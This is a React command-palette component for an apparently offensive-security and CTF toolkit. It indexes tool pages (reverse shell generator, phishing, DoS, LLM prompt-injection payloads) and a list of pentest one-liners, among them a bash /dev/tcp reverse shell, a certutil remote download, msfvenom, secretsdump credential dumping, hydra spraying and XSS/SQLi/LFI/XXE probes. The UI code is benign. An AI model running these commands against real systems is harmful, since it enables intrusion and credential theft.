import { useState, useEffect, useMemo, useRef, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import {
  LayoutDashboard,
  Code,
  Binary,
  Terminal,
  Hash,
  KeyRound,
  Regex,
  BookOpen,
  Shield,
  Flag,
  Cpu,
  Globe,
  PenTool,
  GitCompare,
  List,
  Scan,
  MapPin,
  Send,
  Radio,
  FileSearch,
  Puzzle,
  Settings,
  Users,
  Mail,
  Cookie,
  Zap,
  Eye,
  Unplug,
  Bug,
  Radar,
  VenetianMask,
  Pencil,
  Wifi,
  Brain,
  FileKey,
  Search,
  Network,
  FileText,
  StickyNote,
} from "lucide-react";

const CATEGORIES = [
  {
    label: "Core",
    pages: [
      {
        name: "Dashboard",
        path: "/",
        icon: LayoutDashboard,
        desc: "Overview & stats",
        keys: ["home", "main"],
      },
      {
        name: "Scripts",
        path: "/scripts",
        icon: Code,
        desc: "Script library & viewer",
        keys: ["code", "bash"],
      },
      {
        name: "Terminal",
        path: "/terminal",
        icon: Terminal,
        desc: "Built-in command terminal",
        keys: ["shell", "cli", "console"],
      },
    ],
  },
  {
    label: "Encode & Decode",
    pages: [
      {
        name: "Encoding",
        path: "/encoding",
        icon: Binary,
        desc: "Chain encoder/decoder + auto-detect",
        keys: ["base64", "hex", "url", "morse", "caesar"],
      },
      {
        name: "Crypto Toolkit",
        path: "/crypto-toolkit",
        icon: FileKey,
        desc: "Hashes, XOR, frequency, classical ciphers, crypto ref",
        keys: ["aes", "rsa", "vigenere", "xor", "hmac", "sha256"],
      },
      {
        name: "JWT Debugger",
        path: "/jwt",
        icon: KeyRound,
        desc: "Decode & inspect JWTs",
        keys: ["token", "json web token", "jwt"],
      },
      {
        name: "Deobfuscator",
        path: "/deobfuscator",
        icon: Unplug,
        desc: "JS/HTML deobfuscation, hex inspector",
        keys: ["decode", "reverse", "brainfuck", "jsfuck"],
      },
      {
        name: "Steganography",
        path: "/stego",
        icon: Eye,
        desc: "LSB stego, image analysis, text stego",
        keys: ["hidden", "image", "lsb", "watermark"],
      },
    ],
  },
  {
    label: "Generators",
    pages: [
      {
        name: "Rev Shell Gen",
        path: "/revshell",
        icon: Terminal,
        desc: "Reverse shell generator",
        keys: ["reverse shell", "nc", "netcat", "bash"],
      },
      {
        name: "Wordlist Gen",
        path: "/wordlist",
        icon: List,
        desc: "Build custom wordlists",
        keys: ["dictionary", "password", "brute"],
      },
      {
        name: "Listener",
        path: "/listener",
        icon: Radio,
        desc: "Reverse shell listener manager",
        keys: ["nc", "socat", "pwncat", "metasploit"],
      },
    ],
  },
  {
    label: "Analysis",
    pages: [
      {
        name: "Header Analyzer",
        path: "/headers",
        icon: Scan,
        desc: "HTTP header security audit",
        keys: ["csp", "hsts", "cors", "http"],
      },
      {
        name: "IP Lookup",
        path: "/iplookup",
        icon: MapPin,
        desc: "IP geolocation & network info",
        keys: ["geo", "whois", "location", "dns"],
      },
      {
        name: "File Analyzer",
        path: "/file-analyzer",
        icon: FileSearch,
        desc: "File magic, hashes, entropy, strings",
        keys: ["hash", "md5", "sha", "magic bytes"],
      },
      {
        name: "Forensics Toolkit",
        path: "/forensics",
        icon: Search,
        desc: "Hex viewer, strings, magic, EXIF, CLI ref",
        keys: ["hex", "exif", "strings", "volatility", "disk"],
      },
      {
        name: "Network Scanner",
        path: "/network-scanner",
        icon: Network,
        desc: "Port scanner, nmap cheatsheet, service enum",
        keys: ["nmap", "port", "scan", "tcp", "udp", "service"],
      },
      {
        name: "Diff Viewer",
        path: "/diff",
        icon: GitCompare,
        desc: "Side-by-side text diff",
        keys: ["compare", "merge", "difference"],
      },
      {
        name: "Regex Tester",
        path: "/regex",
        icon: Regex,
        desc: "Live regex matching",
        keys: ["pattern", "regexp", "match"],
      },
      {
        name: "Utilities",
        path: "/utilities",
        icon: Hash,
        desc: "Hash, subnet, ports, epoch converter",
        keys: ["subnet", "port", "timestamp", "epoch", "cidr"],
      },
    ],
  },
  {
    label: "Offensive",
    pages: [
      {
        name: "Proxy Suite",
        path: "/proxy",
        icon: Radar,
        desc: "Repeater, intruder, decoder, sequencer",
        keys: ["burp", "repeater", "intruder", "http proxy"],
      },
      {
        name: "Phishing",
        path: "/phishing",
        icon: Mail,
        desc: "Templates, landing pages, link obfuscation",
        keys: ["email", "social engineering", "credential"],
      },
      {
        name: "Social Engineering",
        path: "/social-engineering",
        icon: Users,
        desc: "Pretexting, SE vectors, tools, payload delivery ref",
        keys: ["pretext", "vishing", "gophish", "setoolkit", "se toolkit"],
      },
      {
        name: "Spoofing",
        path: "/spoofing",
        icon: VenetianMask,
        desc: "MAC, User-Agent, IP, Referer, DNS",
        keys: ["mac address", "user agent", "xff", "origin"],
      },
      {
        name: "Tampering",
        path: "/tampering",
        icon: Pencil,
        desc: "Request builder, parameter tamper, injection",
        keys: ["parameter", "header injection", "smuggling"],
      },
      {
        name: "Cookie & Storage",
        path: "/cookies",
        icon: Cookie,
        desc: "Cookie editor, localStorage, session crafter",
        keys: ["cookie", "localstorage", "sessionstorage", "xss"],
      },
      {
        name: "WiFi & Wireless",
        path: "/wifi",
        icon: Wifi,
        desc: "Captive portal, WiFi attacks, Flipper wireless",
        keys: ["wifi", "aircrack", "deauth", "wpa", "flipper"],
      },
      {
        name: "DoS & Stress",
        path: "/ddos-tool",
        icon: Zap,
        desc: "Attack vectors, stress tools, rate limiter calc",
        keys: ["ddos", "dos", "stress", "rate limit"],
      },
      {
        name: "AI Injection",
        path: "/prompt-injection",
        icon: Brain,
        desc: "124 payloads, builder, fuzzer, OWASP LLM Top 10",
        keys: ["prompt injection", "jailbreak", "llm", "ai", "dan"],
      },
      {
        name: "Password Cracking",
        path: "/cracker",
        icon: KeyRound,
        desc: "Hashcat, John the Ripper, hash ID, wordlists, rules",
        keys: ["hashcat", "john", "crack", "hash", "ntlm", "bcrypt", "wordlist", "rockyou", "brute force"],
      },
    ],
  },
  {
    label: "Intel & Reference",
    pages: [
      {
        name: "Vuln Explorer",
        path: "/vulns",
        icon: Bug,
        desc: "153 CVEs, advisor, exploit patterns, CVSS",
        keys: ["cve", "vulnerability", "exploit", "cvss"],
      },
      {
        name: "Exploit & CVE Search",
        path: "/exploit-search",
        icon: Bug,
        desc: "Live NVD search, exploit-db, CVSS calculator",
        keys: ["cve", "nvd", "exploit", "searchsploit", "cvss"],
      },
      {
        name: "References",
        path: "/references",
        icon: BookOpen,
        desc: "Linux, Windows, Nmap, MSF, Web",
        keys: ["cheatsheet", "commands", "nmap", "metasploit"],
      },
      {
        name: "Payloads",
        path: "/payloads",
        icon: Shield,
        desc: "XSS, SQLi, LFI, CMDi, SSTI, XXE",
        keys: ["xss", "sqli", "lfi", "ssti", "xxe", "injection"],
      },
      {
        name: "OSINT & Recon",
        path: "/osint",
        icon: Globe,
        desc: "Dork generator & recon tools",
        keys: ["dork", "google", "shodan", "subdomain"],
      },
      {
        name: "Flipper Zero",
        path: "/flipper",
        icon: Cpu,
        desc: "Sub-GHz, RFID, IR, BadUSB, GPIO",
        keys: ["flipper", "rfid", "nfc", "badusb", "ir"],
      },
      {
        name: "API Tester",
        path: "/api-tester",
        icon: Send,
        desc: "REST API testing tool",
        keys: ["postman", "curl", "http", "rest", "fetch"],
      },
    ],
  },
  {
    label: "CTF",
    pages: [
      {
        name: "CTFs",
        path: "/ctfs",
        icon: Flag,
        desc: "CTF challenge tracker & timer",
        keys: ["ctf", "challenge", "hack the box", "tryhackme"],
      },
      {
        name: "Writeups",
        path: "/writeups",
        icon: PenTool,
        desc: "CTF writeup editor & exporter",
        keys: ["writeup", "notes", "solution", "report"],
      },
      {
        name: "Collab Mode",
        path: "/collab",
        icon: Users,
        desc: "Local-first team workspace",
        keys: ["team", "collaborate", "share", "room"],
      },
      {
        name: "Notes & Engagements",
        path: "/notes",
        icon: StickyNote,
        desc: "Note-taking, targets, checklists per engagement",
        keys: ["notes", "engagement", "targets", "checklist", "pentest"],
      },
    ],
  },
  {
    label: "System",
    pages: [
      {
        name: "Report Generator",
        path: "/report-generator",
        icon: FileText,
        desc: "Pentest report builder with finding templates",
        keys: ["report", "pentest", "findings", "markdown", "executive"],
      },
      {
        name: "Plugins",
        path: "/plugins",
        icon: Puzzle,
        desc: "Custom tools & cheatsheets",
        keys: ["plugin", "custom", "extension"],
      },
      {
        name: "Settings",
        path: "/settings",
        icon: Settings,
        desc: "App configuration & data management",
        keys: ["config", "preferences", "export", "import", "backup"],
      },
    ],
  },
];

const ALL_PAGES = CATEGORIES.flatMap((c) =>
  c.pages.map((p) => ({ ...p, category: c.label })),
);

const CONTENT_INDEX = [
  {
    page: "/references",
    section: "Linux",
    text: "find / -perm -4000 2>/dev/null",
    desc: "Find SUID binaries",
  },
  {
    page: "/references",
    section: "Nmap",
    text: "nmap -sV -sC -p- target",
    desc: "Full port scan with scripts",
  },
  {
    page: "/payloads",
    section: "XSS",
    text: "<script>alert(1)</script>",
    desc: "Basic XSS test",
  },
  {
    page: "/payloads",
    section: "SQLi",
    text: "' OR 1=1--",
    desc: "Basic SQL injection",
  },
  {
    page: "/payloads",
    section: "LFI",
    text: "../../../../etc/passwd",
    desc: "Linux LFI path traversal",
  },
  {
    page: "/references",
    section: "Metasploit",
    text: "msfvenom -p linux/x64/shell_reverse_tcp",
    desc: "Generate reverse shell payload",
  },
  {
    page: "/references",
    section: "Web",
    text: "gobuster dir -u http://target -w wordlist.txt",
    desc: "Directory brute force",
  },
  {
    page: "/references",
    section: "Linux",
    text: "sudo -l",
    desc: "List sudo privileges",
  },
  {
    page: "/references",
    section: "Windows",
    text: "whoami /priv",
    desc: "Check Windows privileges",
  },
  {
    page: "/references",
    section: "Nmap",
    text: "nmap --script vuln target",
    desc: "Vulnerability scan",
  },
  {
    page: "/references",
    section: "Linux",
    text: 'grep -r "password" /home 2>/dev/null',
    desc: "Hunt creds in home dirs",
  },
  {
    page: "/references",
    section: "Web",
    text: "ffuf -u http://target/FUZZ -w wordlist.txt",
    desc: "Fast web fuzzer",
  },
  {
    page: "/references",
    section: "Web",
    text: 'sqlmap -u "http://target?id=1" --dbs',
    desc: "Enumerate DBs via SQLi",
  },
  {
    page: "/payloads",
    section: "CMDi",
    text: "; cat /etc/passwd",
    desc: "Unix command injection chain",
  },
  {
    page: "/payloads",
    section: "SSTI",
    text: "{{7*7}}",
    desc: "Probe for SSTI (Jinja-style)",
  },
  {
    page: "/payloads",
    section: "XXE",
    text: '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
    desc: "XXE local file read entity",
  },
  {
    page: "/references",
    section: "Linux",
    text: "linpeas.sh",
    desc: "Linux privilege escalation enum",
  },
  {
    page: "/references",
    section: "Windows",
    text: "winPEAS.exe",
    desc: "Windows privilege escalation enum",
  },
  {
    page: "/references",
    section: "Nmap",
    text: "nmap -Pn -sS -p- --min-rate 5000 target",
    desc: "Fast SYN scan all ports",
  },
  {
    page: "/references",
    section: "Web",
    text: "curl -i -X OPTIONS http://target/",
    desc: "Check allowed HTTP methods",
  },
  {
    page: "/references",
    section: "Cracking",
    text: "hashcat -m 0 hash.txt wordlist.txt",
    desc: "MD5 dictionary attack",
  },
  {
    page: "/references",
    section: "Cracking",
    text: "john --wordlist=rockyou.txt hashes.txt",
    desc: "John the Ripper crack",
  },
  {
    page: "/references",
    section: "Network",
    text: "tcpdump -i any -nn host x.x.x.x",
    desc: "Capture traffic to/from host",
  },
  {
    page: "/references",
    section: "Recon",
    text: "subfinder -d example.com -silent",
    desc: "Passive subdomain enum",
  },
  {
    page: "/references",
    section: "AD",
    text: "impacket-secretsdump domain/user:pass@dc",
    desc: "Dump NTDS / SAM hashes",
  },
  {
    page: "/references",
    section: "Windows",
    text: "certutil -urlcache -f http://ip/s.exe s.exe",
    desc: "Download file via certutil",
  },
  {
    page: "/references",
    section: "Linux",
    text: "bash -i >& /dev/tcp/IP/PORT 0>&1",
    desc: "Bash TCP reverse shell",
  },
  {
    page: "/references",
    section: "Web",
    text: "nikto -h http://target",
    desc: "Web server vulnerability scan",
  },
  {
    page: "/references",
    section: "Brute",
    text: "hydra -l admin -P pass.txt ssh://target",
    desc: "SSH password spray",
  },
  {
    page: "/references",
    section: "Linux",
    text: "getcap -r / 2>/dev/null",
    desc: "Find binaries with capabilities",
  },
];

const SECTION_BADGE_COLORS = {
  Linux: "#34D399",
  Windows: "#60A5FA",
  Nmap: "#F472B6",
  Metasploit: "#FBBF24",
  Web: "#A78BFA",
  XSS: "#FB7185",
  SQLi: "#38BDF8",
  LFI: "#4ADE80",
  CMDi: "#F97316",
  SSTI: "#C084FC",
  XXE: "#2DD4BF",
  Cracking: "#EAB308",
  Network: "#94A3B8",
  AD: "#818CF8",
  SMB: "#22D3EE",
  Brute: "#FB923C",
  Recon: "#5EEAD4",
};

const CAT_COLORS = {
  Core: "#6EE7B7",
  "Encode & Decode": "#A78BFA",
  Generators: "#F472B6",
  Analysis: "#38BDF8",
  Offensive: "#FB7185",
  "Intel & Reference": "#FBBF24",
  CTF: "#FB7185",
  System: "#6B7280",
};

function scoreMatch(query, page) {
  const q = query.toLowerCase();
  const name = page.name.toLowerCase();
  const desc = page.desc.toLowerCase();
  const keys = (page.keys || []).join(" ").toLowerCase();

  if (name === q) return 100;
  if (name.startsWith(q)) return 90;
  if (name.includes(q)) return 80;
  if (keys.includes(q)) return 70;
  if (desc.includes(q)) return 50;

  let qi = 0;
  for (let i = 0; i < name.length && qi < q.length; i++) {
    if (name[i] === q[qi]) qi++;
  }
  if (qi === q.length) return 40;

  qi = 0;
  const all = `${name} ${desc} ${keys}`;
  for (let i = 0; i < all.length && qi < q.length; i++) {
    if (all[i] === q[qi]) qi++;
  }
  return qi === q.length ? 30 : 0;
}

function highlightMatch(text, query) {
  if (!query) return text;
  const q = query.toLowerCase();
  const lower = text.toLowerCase();
  const idx = lower.indexOf(q);
  if (idx >= 0) {
    return (
      <>
        {text.slice(0, idx)}
        <span style={{ color: "#6EE7B7", fontWeight: 600 }}>
          {text.slice(idx, idx + q.length)}
        </span>
        {text.slice(idx + q.length)}
      </>
    );
  }
  return text;
}

export default function CommandPalette({ open, onClose }) {
  const [query, setQuery] = useState("");
  const [selectedIndex, setSelectedIndex] = useState(0);
  const inputRef = useRef(null);
  const itemRefs = useRef([]);
  const navigate = useNavigate();
  const qTrim = query.trim();
  const qLower = qTrim.toLowerCase();

  const isSearching = qTrim.length > 0;

  const filteredPages = useMemo(() => {
    if (!isSearching) return [];
    return ALL_PAGES.map((p) => ({ ...p, score: scoreMatch(qTrim, p) }))
      .filter((p) => p.score > 0)
      .sort((a, b) => b.score - a.score);
  }, [qTrim, isSearching]);

  const contentMatches = useMemo(() => {
    if (qTrim.length < 2) return [];
    return CONTENT_INDEX.filter(
      (e) =>
        e.text.toLowerCase().includes(qLower) ||
        e.desc.toLowerCase().includes(qLower),
    ).slice(0, 6);
  }, [qTrim, qLower]);

  const browseSections = useMemo(() => {
    if (isSearching) return [];
    return CATEGORIES;
  }, [isSearching]);

  const browseItems = useMemo(() => {
    if (isSearching) return [];
    return browseSections.flatMap((s) => s.pages);
  }, [browseSections, isSearching]);

  const totalSelectable = isSearching
    ? filteredPages.length + contentMatches.length
    : browseItems.length;

  useEffect(() => setSelectedIndex(0), [query]);

  useEffect(() => {
    if (open) {
      setQuery("");
      setSelectedIndex(0);
      requestAnimationFrame(() => inputRef.current?.focus());
    }
  }, [open]);

  useEffect(() => {
    const el = itemRefs.current[selectedIndex];
    if (el) el.scrollIntoView({ block: "nearest" });
  }, [selectedIndex]);

  const handleSelect = useCallback(
    (path) => {
      onClose();
      navigate(path);
    },
    [onClose, navigate],
  );

  const handleKeyDown = useCallback(
    (e) => {
      if (e.key === "Escape") {
        e.preventDefault();
        onClose();
        return;
      }
      if (e.key === "ArrowDown") {
        e.preventDefault();
        if (totalSelectable <= 0) return;
        setSelectedIndex((i) => (i < totalSelectable - 1 ? i + 1 : 0));
        return;
      }
      if (e.key === "ArrowUp") {
        e.preventDefault();
        if (totalSelectable <= 0) return;
        setSelectedIndex((i) => (i > 0 ? i - 1 : totalSelectable - 1));
        return;
      }
      if (e.key === "Enter") {
        e.preventDefault();
        if (isSearching) {
          if (selectedIndex < filteredPages.length) {
            handleSelect(filteredPages[selectedIndex].path);
          } else {
            const ci = selectedIndex - filteredPages.length;
            if (contentMatches[ci]) handleSelect(contentMatches[ci].page);
          }
        } else {
          if (browseItems[selectedIndex])
            handleSelect(browseItems[selectedIndex].path);
        }
      }
    },
    [
      totalSelectable,
      selectedIndex,
      filteredPages,
      contentMatches,
      browseItems,
      handleSelect,
      onClose,
      isSearching,
    ],
  );

  if (!open) return null;

  let globalIdx = 0;

  return (
    <div
      onClick={onClose}
      onKeyDown={handleKeyDown}
      style={{
        position: "fixed",
        inset: 0,
        zIndex: 9999,
        background: "rgba(0,0,0,0.55)",
        backdropFilter: "blur(12px)",
        display: "flex",
        alignItems: "flex-start",
        justifyContent: "center",
        paddingTop: "min(18vh, 140px)",
      }}
    >
      <div
        onClick={(e) => e.stopPropagation()}
        style={{
          background: "#1A1F2E",
          border: "1px solid rgba(255,255,255,0.08)",
          borderRadius: 16,
          maxWidth: 620,
          width: "92%",
          boxShadow: "0 24px 80px rgba(0,0,0,0.6)",
          display: "flex",
          flexDirection: "column",
          overflow: "hidden",
        }}
      >
        {/* Search input */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: 10,
            padding: "14px 18px",
            borderBottom: "1px solid rgba(255,255,255,0.06)",
          }}
        >
          <span
            style={{
              color: "rgba(255,255,255,0.2)",
              fontSize: 16,
              flexShrink: 0,
            }}
          >
            &#8984;
          </span>
          <input
            ref={inputRef}
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            onKeyDown={handleKeyDown}
            placeholder="Search tools, commands, payloads..."
            style={{
              background: "transparent",
              border: "none",
              fontFamily: "JetBrains Mono, monospace",
              fontSize: 14,
              color: "#E2E8F0",
              outline: "none",
              width: "100%",
              boxSizing: "border-box",
            }}
          />
          {qTrim && (
            <button
              onClick={() => setQuery("")}
              style={{
                background: "rgba(255,255,255,0.06)",
                border: "none",
                borderRadius: 4,
                padding: "2px 8px",
                fontFamily: "JetBrains Mono, monospace",
                fontSize: 9,
                color: "#6B7280",
                cursor: "pointer",
                flexShrink: 0,
              }}
            >
              Clear
            </button>
          )}
        </div>

        {/* Results */}
        <div
          style={{
            maxHeight: 420,
            overflowY: "auto",
            scrollbarWidth: "thin",
            scrollbarColor: "rgba(255,255,255,0.06) transparent",
          }}
        >
          {isSearching ? (
            <>
              {filteredPages.length === 0 && contentMatches.length === 0 && (
                <div
                  style={{
                    fontFamily: "JetBrains Mono, monospace",
                    fontSize: 12,
                    color: "#3B4252",
                    padding: 32,
                    textAlign: "center",
                  }}
                >
                  No results for "{qTrim}"
                </div>
              )}

              {filteredPages.length > 0 && (
                <div style={{ padding: "8px 8px 4px" }}>
                  <div
                    style={{
                      fontFamily: "JetBrains Mono, monospace",
                      fontSize: 9,
                      fontWeight: 700,
                      color: "rgba(255,255,255,0.15)",
                      textTransform: "uppercase",
                      letterSpacing: "0.08em",
                      padding: "4px 10px 6px",
                    }}
                  >
                    Tools · {filteredPages.length} result
                    {filteredPages.length !== 1 ? "s" : ""}
                  </div>
                  {filteredPages.map((page, i) => {
                    const isSelected = i === selectedIndex;
                    const Icon = page.icon;
                    const catColor = CAT_COLORS[page.category] || "#6B7280";
                    return (
                      <div
                        key={page.path}
                        ref={(el) => {
                          itemRefs.current[i] = el;
                        }}
                        onClick={() => handleSelect(page.path)}
                        onMouseEnter={() => setSelectedIndex(i)}
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: 10,
                          padding: "9px 12px",
                          borderRadius: 8,
                          cursor: "pointer",
                          transition: "background 80ms",
                          background: isSelected
                            ? "rgba(110,231,183,0.07)"
                            : "transparent",
                        }}
                      >
                        <div
                          style={{
                            width: 28,
                            height: 28,
                            borderRadius: 6,
                            background: isSelected
                              ? `${catColor}15`
                              : "rgba(255,255,255,0.03)",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            flexShrink: 0,
                            transition: "background 80ms",
                          }}
                        >
                          <Icon
                            size={14}
                            strokeWidth={2}
                            style={{
                              color: isSelected
                                ? catColor
                                : "rgba(255,255,255,0.3)",
                            }}
                          />
                        </div>
                        <div style={{ flex: 1, minWidth: 0 }}>
                          <div
                            style={{
                              fontFamily: "Space Grotesk, sans-serif",
                              fontSize: 13,
                              fontWeight: 500,
                              color: "#D1D5DB",
                            }}
                          >
                            {highlightMatch(page.name, qTrim)}
                          </div>
                          <div
                            style={{
                              fontFamily: "JetBrains Mono, monospace",
                              fontSize: 10,
                              color: "#4B5563",
                              whiteSpace: "nowrap",
                              overflow: "hidden",
                              textOverflow: "ellipsis",
                            }}
                          >
                            {page.desc}
                          </div>
                        </div>
                        <span
                          style={{
                            fontFamily: "JetBrains Mono, monospace",
                            fontSize: 8,
                            fontWeight: 600,
                            color: catColor,
                            opacity: 0.5,
                            textTransform: "uppercase",
                            letterSpacing: "0.06em",
                            flexShrink: 0,
                          }}
                        >
                          {page.category}
                        </span>
                      </div>
                    );
                  })}
                </div>
              )}

              {contentMatches.length > 0 && (
                <div style={{ padding: "4px 8px 8px" }}>
                  <div
                    style={{
                      height: 1,
                      background: "rgba(255,255,255,0.04)",
                      margin: "4px 10px 8px",
                    }}
                  />
                  <div
                    style={{
                      fontFamily: "JetBrains Mono, monospace",
                      fontSize: 9,
                      fontWeight: 700,
                      color: "rgba(255,255,255,0.15)",
                      textTransform: "uppercase",
                      letterSpacing: "0.08em",
                      padding: "4px 10px 6px",
                    }}
                  >
                    Commands & Payloads
                  </div>
                  {contentMatches.map((entry, j) => {
                    const gi = filteredPages.length + j;
                    const isSelected = gi === selectedIndex;
                    const badgeColor =
                      SECTION_BADGE_COLORS[entry.section] ?? "#6B7280";
                    return (
                      <div
                        key={`${entry.page}-${j}-${entry.text.slice(0, 20)}`}
                        ref={(el) => {
                          itemRefs.current[gi] = el;
                        }}
                        onClick={() => handleSelect(entry.page)}
                        onMouseEnter={() => setSelectedIndex(gi)}
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: 10,
                          padding: "8px 12px",
                          borderRadius: 8,
                          cursor: "pointer",
                          transition: "background 80ms",
                          background: isSelected
                            ? "rgba(110,231,183,0.07)"
                            : "transparent",
                        }}
                      >
                        <span
                          style={{
                            fontFamily: "JetBrains Mono, monospace",
                            fontSize: 8,
                            fontWeight: 700,
                            color: badgeColor,
                            background: `${badgeColor}18`,
                            border: `1px solid ${badgeColor}33`,
                            borderRadius: 999,
                            padding: "2px 7px",
                            flexShrink: 0,
                          }}
                        >
                          {entry.section}
                        </span>
                        <div style={{ flex: 1, minWidth: 0 }}>
                          <div
                            style={{
                              fontFamily: "JetBrains Mono, monospace",
                              fontSize: 11,
                              color: "#CBD5E1",
                              whiteSpace: "nowrap",
                              overflow: "hidden",
                              textOverflow: "ellipsis",
                            }}
                          >
                            {highlightMatch(entry.text, qTrim)}
                          </div>
                          <div
                            style={{
                              fontFamily: "JetBrains Mono, monospace",
                              fontSize: 9,
                              color: "#4B5563",
                            }}
                          >
                            {entry.desc}
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </>
          ) : (
            /* Browse mode — show categorized sections */
            <div style={{ padding: "6px 8px" }}>
              {CATEGORIES.map((cat) => {
                const catColor = CAT_COLORS[cat.label] || "#6B7280";
                return (
                  <div key={cat.label} style={{ marginBottom: 4 }}>
                    <div
                      style={{
                        fontFamily: "JetBrains Mono, monospace",
                        fontSize: 9,
                        fontWeight: 700,
                        color: catColor,
                        opacity: 0.5,
                        textTransform: "uppercase",
                        letterSpacing: "0.08em",
                        padding: "8px 10px 4px",
                      }}
                    >
                      {cat.label}
                    </div>
                    {cat.pages.map((page) => {
                      const idx = globalIdx++;
                      const isSelected = idx === selectedIndex;
                      const Icon = page.icon;
                      return (
                        <div
                          key={page.path}
                          ref={(el) => {
                            itemRefs.current[idx] = el;
                          }}
                          onClick={() => handleSelect(page.path)}
                          onMouseEnter={() => setSelectedIndex(idx)}
                          style={{
                            display: "flex",
                            alignItems: "center",
                            gap: 10,
                            padding: "7px 12px",
                            borderRadius: 8,
                            cursor: "pointer",
                            transition: "background 80ms",
                            background: isSelected
                              ? "rgba(110,231,183,0.07)"
                              : "transparent",
                          }}
                        >
                          <Icon
                            size={14}
                            strokeWidth={2}
                            style={{
                              color: isSelected
                                ? catColor
                                : "rgba(255,255,255,0.25)",
                              flexShrink: 0,
                              transition: "color 80ms",
                            }}
                          />
                          <span
                            style={{
                              fontFamily: "Space Grotesk, sans-serif",
                              fontSize: 12.5,
                              fontWeight: isSelected ? 600 : 400,
                              color: isSelected
                                ? "#E2E8F0"
                                : "rgba(255,255,255,0.5)",
                            }}
                          >
                            {page.name}
                          </span>
                          <span
                            style={{
                              fontFamily: "JetBrains Mono, monospace",
                              fontSize: 9.5,
                              color: "#3B4252",
                              marginLeft: "auto",
                              whiteSpace: "nowrap",
                              overflow: "hidden",
                              textOverflow: "ellipsis",
                              maxWidth: 200,
                            }}
                          >
                            {page.desc}
                          </span>
                        </div>
                      );
                    })}
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* Footer */}
        <div
          style={{
            borderTop: "1px solid rgba(255,255,255,0.04)",
            padding: "9px 16px",
            display: "flex",
            justifyContent: "space-between",
            fontFamily: "JetBrains Mono, monospace",
            fontSize: 10,
            color: "#3B4252",
          }}
        >
          <div style={{ display: "flex", gap: 14 }}>
            <span>↑↓ navigate</span>
            <span>↵ open</span>
            <span>esc close</span>
          </div>
          <span>{ALL_PAGES.length} tools</span>
        </div>
      </div>
    </div>
  );
}
